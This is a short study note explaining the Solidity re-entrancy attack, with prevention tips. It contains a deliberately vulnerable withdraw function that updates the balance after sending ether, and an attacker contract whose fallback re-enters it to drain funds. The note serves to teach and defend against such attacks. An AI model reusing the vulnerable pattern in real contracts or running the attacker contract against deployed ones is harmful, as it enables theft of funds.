## Re-entrancy Attack 

[Reference](https://solidity-by-example.org/hacks/re-entrancy/)

Reentrancy occurs when contract `A` calls contract `B`, but contract `B` is able to "re-enter" contract A prior to the execution completing. Observe the attack in the following:

Contract `A` 

```solidity
function deposit() public payable { 
	balances[msg.sender] += msg.value; 
} 

function withdraw() public { 
	uint bal = balances[msg.sender]; 
	require(bal > 0); 
	(bool sent, ) = msg.sender.call{value: bal}(""); 
	require(sent, "Failed to send Ether"); 
	balances[msg.sender] = 0; 
}
```

Contract `B` (malicious contract)

```solidity
fallback() external payable { 
	if (address(etherStore).balance >= 1 ether) { 
	    etherStore.withdraw(); 
	} 
}

function attack() external payable { 
	require(msg.value >= 1 ether); 
	etherStore.deposit{value: 1 ether}(); 
	etherStore.withdraw(); 
}
```

The reetrancy attack occurs when:
- Contract `B` calls contract A's `withdraw` function 
* Contract `A` forwards the balance through contract `B` `fallback()` function using `call()` before reducing the balance. 
* Contract `B`  fallback then calls Contract `A` withdraw again. Creating a loop enabling contract B to withdraw all of Contract `A`'s ether balance

For this reason it is advisable to avoid low level calls to contracts due to this exploitable behavior.

Preventative techniques
- Ensure state changes (like reducing balance) happen before calling external contract 
- Use function modifiers
- Strongly consider techniques when making calls to external contracts

Refer to [[../Code Review/Repository Breakdowns]] for repository deep dives and just reading good codes.
Refer to [[../Code Review/Pull Request Breakdowns]] for pull requests.
